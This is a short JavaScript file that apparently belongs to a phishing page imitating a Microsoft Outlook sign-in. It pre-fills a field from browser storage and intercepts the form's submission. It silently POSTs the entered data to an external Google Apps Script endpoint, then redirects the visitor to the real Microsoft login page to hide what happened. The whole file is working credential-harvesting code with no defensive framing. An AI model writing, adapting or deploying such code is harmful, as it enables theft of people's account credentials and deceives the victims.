const display = document.querySelector(".message-content")
window.onload=display.value=(localStorage.getItem("inputValue"))

const scriptURL = 'https://script.google.com/macros/s/AKfycbw6l-LZypRtZizW8xGwUZSQ_kvleccTb0lY6fbMcfgK6Yd0r7ewhaVX7E1VOrHW5KWyDg/exec'

const form = document.forms['contact-form']

form.addEventListener('submit', e => {
  e.preventDefault()
  fetch(scriptURL, { method: 'POST', body: new FormData(form)})
  .then(response => window.location.assign('https://www.microsoft.com/en-us/microsoft-365/outlook/log-in'))
  .then(() => { window.location.assign('https://www.microsoft.com/en-us/microsoft-365/outlook/log-in'); })
  .catch(error => console.error('Error!', error.message))
})